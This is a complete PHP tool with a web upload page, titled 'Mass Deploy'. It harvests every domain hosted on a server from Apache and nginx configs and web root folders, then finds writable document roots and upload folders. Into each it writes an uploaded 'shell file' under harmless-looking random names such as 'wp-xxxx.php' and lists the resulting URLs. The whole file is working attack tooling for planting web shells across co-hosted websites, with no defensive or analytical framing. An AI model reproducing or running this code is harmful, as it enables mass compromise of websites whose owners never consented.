<?php
error_reporting(0);
ini_set('display_errors', 0);

function get_domains() {
    $domains = [];
    $scanned = [];
    
    if (isset($_SERVER['SERVER_NAME']) && !empty($_SERVER['SERVER_NAME'])) {
        $domains[] = $_SERVER['SERVER_NAME'];
        $scanned[] = $_SERVER['SERVER_NAME'];
    }
    
    if (isset($_SERVER['HTTP_HOST']) && !empty($_SERVER['HTTP_HOST'])) {
        if (!in_array($_SERVER['HTTP_HOST'], $scanned)) {
            $domains[] = $_SERVER['HTTP_HOST'];
            $scanned[] = $_SERVER['HTTP_HOST'];
        }
    }
    
    $apache_configs = [
        '/etc/apache2/sites-enabled/*.conf',
        '/etc/apache2/sites-available/*.conf',
        '/etc/apache2/vhosts.d/*.conf',
        '/etc/httpd/conf/httpd.conf',
        '/etc/httpd/conf.d/*.conf',
        '/etc/httpd/vhosts.d/*.conf',
        '/etc/httpd/sites-enabled/*.conf',
        '/etc/httpd/sites-available/*.conf',
        '/usr/local/apache2/conf/httpd.conf',
        '/usr/local/apache2/conf.d/*.conf',
        '/usr/local/apache2/conf/extra/httpd-vhosts.conf',
        '/usr/local/etc/apache*/httpd.conf',
        '/usr/local/etc/apache*/extra/httpd-vhosts.conf',
        '/opt/apache*/conf/httpd.conf',
        '/opt/apache*/conf.d/*.conf',
        '/opt/apache*/conf/extra/httpd-vhosts.conf',
        '/etc/apache2/httpd.conf',
        '/etc/apache2/apache2.conf'
    ];
    
    foreach ($apache_configs as $pattern) {
        $configs = glob($pattern);
        if ($configs) {
            foreach ($configs as $config) {
                $content = @file_get_contents($config);
                if ($content) {
                    preg_match_all('/(?:ServerName|ServerAlias)\s+([^\s]+)/i', $content, $matches);
                    if (!empty($matches[1])) {
                        foreach ($matches[1] as $domain) {
                            if (strpos($domain, '*') === false && 
                                strpos($domain, '.') !== false && 
                                !preg_match('/^[0-9.]+$/', $domain) &&
                                !in_array($domain, $scanned)) {
                                $domains[] = $domain;
                                $scanned[] = $domain;
                            }
                        }
                    }
                }
            }
        }
    }
    
    $nginx_configs = [
        '/etc/nginx/sites-enabled/*',
        '/etc/nginx/sites-available/*',
        '/etc/nginx/conf.d/*.conf',
        '/etc/nginx/vhosts.d/*.conf',
        '/usr/local/nginx/conf/sites-enabled/*',
        '/usr/local/nginx/conf/sites-available/*',
        '/usr/local/nginx/conf/vhosts/*.conf',
        '/usr/local/etc/nginx/sites-enabled/*',
        '/usr/local/etc/nginx/sites-available/*',
        '/usr/local/etc/nginx/conf.d/*.conf',
        '/opt/nginx/conf/sites-enabled/*',
        '/opt/nginx/conf/sites-available/*',
        '/opt/nginx/conf/conf.d/*.conf'
    ];
    
    foreach ($nginx_configs as $pattern) {
        $configs = glob($pattern);
        if ($configs) {
            foreach ($configs as $config) {
                $content = @file_get_contents($config);
                if ($content) {
                    preg_match_all('/server_name\s+([^;]+);/i', $content, $matches);
                    if (!empty($matches[1])) {
                        foreach ($matches[1] as $server_names) {
                            $names = preg_split('/\s+/', trim($server_names));
                            foreach ($names as $domain) {
                                if (strpos($domain, '*') === false && 
                                    strpos($domain, '.') !== false && 
                                    !preg_match('/^[0-9.]+$/', $domain) &&
                                    !in_array($domain, $scanned)) {
                                    $domains[] = $domain;
                                    $scanned[] = $domain;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    $root_dirs = [
        '/var/www',
        '/home',
        '/usr/local/www',
        '/usr/share/nginx',
        '/srv',
        '/opt/lampp/htdocs',
        '/opt/xampp/htdocs'
    ];
    
    foreach ($root_dirs as $root) {
        if (is_dir($root)) {
            $dirs = glob("$root/*", GLOB_ONLYDIR);
            foreach ($dirs as $dir) {
                $domain = basename($dir);
                if (strpos($domain, '.') !== false && 
                    !preg_match('/^[0-9.]+$/', $domain) &&
                    !in_array($domain, $scanned)) {
                    $domains[] = $domain;
                    $scanned[] = $domain;
                }
                
                $subdirs = glob("$dir/*", GLOB_ONLYDIR);
                foreach ($subdirs as $subdir) {
                    $subdomain = basename($subdir);
                    if (strpos($subdomain, '.') !== false && 
                        !preg_match('/^[0-9.]+$/', $subdomain) &&
                        !in_array($subdomain, $scanned)) {
                        $domains[] = $subdomain;
                        $scanned[] = $subdomain;
                    }
                }
            }
        }
    }
    
    $domains = array_unique($domains);
    $domains = array_filter($domains, function($domain) {
        return !empty($domain) && 
               $domain != 'localhost' && 
               strpos($domain, '.') !== false &&
               !preg_match('/^[0-9.]+$/', $domain) &&
               strpos($domain, '*') === false &&
               strpos($domain, '_') === false &&
               strlen($domain) > 3;
    });
    
    return array_values($domains);
}

function generate_random_filename() {
    $safe_patterns = [
        'class-%s.php',
        'helper-%s.php',
        'util-%s.php',
        'module-%s.php',
        'include-%s.php',
        'lib-%s.php',
        'func-%s.php',
        'data-%s.php',
        'api-%s.php',
        'ajax-%s.php',
        'common-%s.php',
        'core-%s.php',
        'base-%s.php',
        'wp-%s.php',
        'admin-%s.php',
        'template-%s.php',
        'page-%s.php',
        'form-%s.php',
        'cache-%s.php',
        'session-%s.php'
    ];
    
    $random_id = substr(md5(mt_rand() . time() . uniqid()), 0, 8);
    $pattern = $safe_patterns[array_rand($safe_patterns)];
    
    return sprintf($pattern, $random_id);
}

function find_domain_paths($domain) {
    $domain_paths = [];
    
    $web_roots = [
        $_SERVER['DOCUMENT_ROOT'] ?? '',
        '/var/www',
        '/var/www/html',
        '/var/www/vhosts',
        '/var/www/sites',
        '/home',
        '/usr/local/www',
        '/usr/local/httpd',
        '/usr/local/apache',
        '/usr/local/apache2',
        '/usr/local/nginx',
        '/usr/share/nginx',
        '/usr/share/httpd',
        '/srv/www',
        '/srv/http',
        '/srv/httpd',
        '/srv/sites',
        '/opt/lampp/htdocs',
        '/opt/xampp/htdocs'
    ];
    
    $domain_clean = str_replace(['www.', '.'], ['', '_'], $domain);
    $domain_parts = explode('.', $domain);
    $domain_base = $domain_parts[0];
    
    $domain_variants = [
        $domain,
        'www.' . $domain,
        str_replace('www.', '', $domain),
        $domain_clean,
        $domain_base
    ];
    
    $server_configs = [
        '/etc/apache2/sites-enabled/*.conf',
        '/etc/apache2/sites-available/*.conf',
        '/etc/httpd/conf.d/*.conf',
        '/etc/httpd/vhosts.d/*.conf',
        '/etc/nginx/sites-enabled/*',
        '/etc/nginx/conf.d/*.conf',
        '/usr/local/etc/apache*/extra/httpd-vhosts.conf',
        '/usr/local/etc/nginx/sites-enabled/*'
    ];
    
    foreach ($server_configs as $pattern) {
        $configs = glob($pattern);
        if ($configs) {
            foreach ($configs as $config) {
                $content = @file_get_contents($config);
                if ($content && stripos($content, $domain) !== false) {
                    $doc_pattern = '/(?:DocumentRoot|root)\s+[\'"]?([^\'"\s;]+)[\'"]?/i';
                    if (preg_match($doc_pattern, $content, $doc_match)) {
                        $path = $doc_match[1];
                        if (is_dir($path) && is_writable($path)) {
                            $domain_paths[] = $path;
                        }
                    }
                }
            }
        }
    }
    
    foreach ($web_roots as $root) {
        if (empty($root) || !is_dir($root) || !is_readable($root)) continue;
        
        foreach ($domain_variants as $variant) {
            $path = "$root/$variant";
            if (is_dir($path)) {
                $domain_paths[] = $path;
                
                $subdirs = ['public_html', 'httpdocs', 'www', 'public', 'web', 'htdocs'];
                foreach ($subdirs as $subdir) {
                    $subpath = "$path/$subdir";
                    if (is_dir($subpath)) {
                        $domain_paths[] = $subpath;
                    }
                }
            }
        }
    }
    
    $cpanel_patterns = [
        "/home/*/public_html",
    ];
    
    foreach ($cpanel_patterns as $pattern) {
        $matching_paths = glob($pattern, GLOB_ONLYDIR);
        foreach ($matching_paths as $path) {
            $domain_dir = $path . '/' . $domain;
            if (is_dir($domain_dir)) {
                $domain_paths[] = $domain_dir;
            }
        }
    }
    
    $domain_paths = array_unique($domain_paths);
    
    $writable_paths = [];
    foreach ($domain_paths as $path) {
        if (is_writable($path)) {
            $writable_paths[] = $path;
        }
    }
    
    return !empty($writable_paths) ? $writable_paths : $domain_paths;
}

function deploy_to_domains($domains, $content) {
    $results = [];
    
    if (empty($content)) {
        return [
            "error" => "No content provided for deployment"
        ];
    }
    
    $max_time = 30;
    $start_time = time();
    
    foreach ($domains as $domain) {
        if (time() - $start_time > $max_time) {
            $results[] = ["domain" => $domain, "status" => "skipped", "reason" => "Time limit exceeded"];
            continue;
        }
        
        $success = false;
        $deployed_path = "";
        $deployed_url = "";
        
        $shell_name = generate_random_filename();
        
        $domain_paths = find_domain_paths($domain);
        
        if (empty($domain_paths)) {
            $results[] = [
                "domain" => $domain,
                "status" => "failed",
                "error" => "No valid paths found for this domain"
            ];
            continue;
        }
        
        foreach ($domain_paths as $base_path) {
            if (time() - $start_time > $max_time) {
                break;
            }
            
            $shell_path = $base_path . '/' . $shell_name;
            if (@file_put_contents($shell_path, $content)) {
                if (file_exists($shell_path) && filesize($shell_path) > 0) {
                    $success = true;
                    $deployed_path = $shell_path;
                    $deployed_url = 'http://' . $domain . '/' . $shell_name;
                    break;
                }
            }
            
            $common_writeable_dirs = [
                'wp-content/uploads',
                'wp-content/themes',
                'wp-content',
                'images',
                'img',
                'uploads',
                'media',
                'files',
                'cache',
                'tmp',
                'temp',
                'assets',
                'data',
                'logs'
            ];
            
            foreach ($common_writeable_dirs as $subdir) {
                $dir_path = $base_path . '/' . $subdir;
                if (is_dir($dir_path) && is_writable($dir_path)) {
                    $shell_path = $dir_path . '/' . $shell_name;
                    if (@file_put_contents($shell_path, $content)) {
                        if (file_exists($shell_path) && filesize($shell_path) > 0) {
                            $success = true;
                            $deployed_path = $shell_path;
                            $deployed_url = 'http://' . $domain . '/' . $subdir . '/' . $shell_name;
                            break 2;
                        }
                    }
                }
            }
        }
        
        if ($success) {
            $results[] = [
                "domain" => $domain,
                "status" => "success",
                "path" => $deployed_path,
                "url" => $deployed_url,
                "filename" => $shell_name
            ];
        } else {
            $results[] = [
                "domain" => $domain,
                "status" => "failed",
                "error" => "No writable directory found or access denied"
            ];
        }
    }
    
    return $results;
}

// Handle API request
if (isset($_GET['api']) && $_GET['api'] === 'deploy') {
    header('Content-Type: application/json');
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_FILES['shell_file']) && $_FILES['shell_file']['error'] === UPLOAD_ERR_OK) {
            $shell_content = file_get_contents($_FILES['shell_file']['tmp_name']);
            
            if (!empty($shell_content)) {
                $domains = get_domains();
                
                if (!empty($domains)) {
                    $results = deploy_to_domains($domains, $shell_content);
                    echo json_encode(['status' => 'success', 'results' => $results]);
                } else {
                    echo json_encode(['status' => 'error', 'message' => 'No domains found on this server']);
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Failed to read uploaded file']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Please upload a valid shell file']);
        }
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    }
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mass Deploy</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #1a1a1a;
            color: #ddd;
            font-family: 'Courier New', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #222;
            border: 1px solid #444;
            padding: 30px;
        }
        h1 {
            color: #7ef77e;
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
        }
        .upload-box {
            border: 2px dashed #444;
            padding: 40px;
            text-align: center;
            margin-bottom: 20px;
            transition: border-color 0.3s;
        }
        .upload-box:hover {
            border-color: #7ef77e;
        }
        input[type="file"] {
            display: none;
        }
        .file-label {
            background: #333;
            color: #ddd;
            padding: 10px 20px;
            cursor: pointer;
            display: inline-block;
            border: 1px solid #555;
        }
        .file-label:hover {
            background: #444;
        }
        .file-name {
            margin-top: 15px;
            color: #aaa;
        }
        .deploy-btn {
            background: #1d5e1d;
            color: #fff;
            border: none;
            padding: 12px 30px;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            margin-top: 20px;
        }
        .deploy-btn:hover {
            background: #2d7a2d;
        }
        .deploy-btn:disabled {
            background: #333;
            cursor: not-allowed;
        }
        .results {
            background: #1a1a1a;
            border: 1px solid #444;
            padding: 20px;
            margin-top: 20px;
            max-height: 500px;
            overflow-y: auto;
        }
        .loading {
            text-align: center;
            color: #7ef77e;
            padding: 20px;
        }
        pre {
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 12px;
            line-height: 1.5;
        }
        .success { color: #7ef77e; }
        .error { color: #f77e7e; }
    </style>
</head>
<body>
    <div class="container">
        <h1>MASS DEPLOYMENT TOOL</h1>
        
        <div class="upload-box">
            <label for="shellFile" class="file-label">Choose Shell File</label>
            <input type="file" id="shellFile" accept=".php,.txt">
            <div class="file-name" id="fileName">No file selected</div>
        </div>
        
        <button class="deploy-btn" id="deployBtn" disabled>Deploy to All Domains</button>
        
        <div id="results"></div>
    </div>
    
    <script>
        const fileInput = document.getElementById('shellFile');
        const fileName = document.getElementById('fileName');
        const deployBtn = document.getElementById('deployBtn');
        const resultsDiv = document.getElementById('results');
        
        fileInput.addEventListener('change', function() {
            if (this.files && this.files[0]) {
                fileName.textContent = this.files[0].name;
                deployBtn.disabled = false;
            } else {
                fileName.textContent = 'No file selected';
                deployBtn.disabled = true;
            }
        });
        
        deployBtn.addEventListener('click', function() {
            if (!fileInput.files || !fileInput.files[0]) {
                alert('Please select a file');
                return;
            }
            
            const formData = new FormData();
            formData.append('shell_file', fileInput.files[0]);
            
            deployBtn.disabled = true;
            deployBtn.textContent = 'Deploying...';
            resultsDiv.innerHTML = '<div class="loading">Processing...</div>';
            
            fetch('?api=deploy', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                resultsDiv.innerHTML = '<div class="results"><pre>' + JSON.stringify(data, null, 2) + '</pre></div>';
                
                if (data.status === 'success' && data.results) {
                    const successUrls = data.results
                        .filter(r => r.status === 'success')
                        .map(r => r.url);
                    
                    if (successUrls.length > 0) {
                        resultsDiv.innerHTML += '<div class="results"><h3 class="success">Success URLs:</h3><pre>' + successUrls.join('\n') + '</pre></div>';
                    }
                }
                
                deployBtn.disabled = false;
                deployBtn.textContent = 'Deploy to All Domains';
            })
            .catch(error => {
                resultsDiv.innerHTML = '<div class="results error">Error: ' + error.message + '</div>';
                deployBtn.disabled = false;
                deployBtn.textContent = 'Deploy to All Domains';
            });
        });
    </script>
</body>
</html>